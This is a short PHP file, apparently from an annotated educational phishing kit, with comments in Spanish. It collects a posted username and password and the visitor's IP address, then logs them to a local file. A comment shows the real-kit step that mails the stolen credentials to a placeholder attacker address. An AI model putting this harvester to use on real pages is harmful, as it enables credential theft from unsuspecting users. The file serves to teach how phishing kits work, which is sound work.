<?php
/*
 * harvest.php — FUNCIONAL, pero con la exfiltración sustituida por un log
 * LOCAL. Ver annotations.md, secciones 3-4, y HOW_TO_RUN_LOCALLY.md.
 *
 * Este script SÍ se ejecuta de verdad si lo sirves con `php -S` (ver
 * HOW_TO_RUN_LOCALLY.md) — es código PHP real y correcto. La única
 * diferencia con un kit real es el paso 4: en vez de enviar el email
 * robado a un servidor externo, lo escribe en un archivo de texto EN TU
 * PROPIO DISCO. Nunca hace ninguna petición de red saliente.
 */

// 1. Recibe usuario/contraseña del formulario
$user = $_POST['username'] ?? null;
$pass = $_POST['password'] ?? null;

// 2. Si faltan campos, redirige para simular un simple error de login
if (!$user || !$pass) {
    header('Location: index.html?error=1');
    exit;
}

// 3. Captura IP y "país" de la víctima (aquí, un valor de ejemplo — un
//    kit real consultaría una API de geolocalización de IP)
$victim_ip = $_SERVER['REMOTE_ADDR'] ?? 'desconocida';
$victim_country = "PAIS_DEMO";

$subject = "[DEMO] - $victim_country";
$message = "Usuario: $user\nClave: $pass\nIP: $victim_ip\nFecha: " . date('c') . "\n";

// 4. EN UN KIT REAL: mail("atacante@ejemplo.com", $subject, $message);
//    AQUÍ: se escribe en un archivo local, nunca sale de tu máquina.
$log_line = "=== $subject ===\n$message\n";
file_put_contents(__DIR__ . '/__DEMO_LOG__.txt', $log_line, FILE_APPEND);

// 5. Redirige a una página de agradecimiento LOCAL (no a un dominio
//    externo inventado, para que el flujo se complete de verdad)
header('Location: thanks.html');
exit;
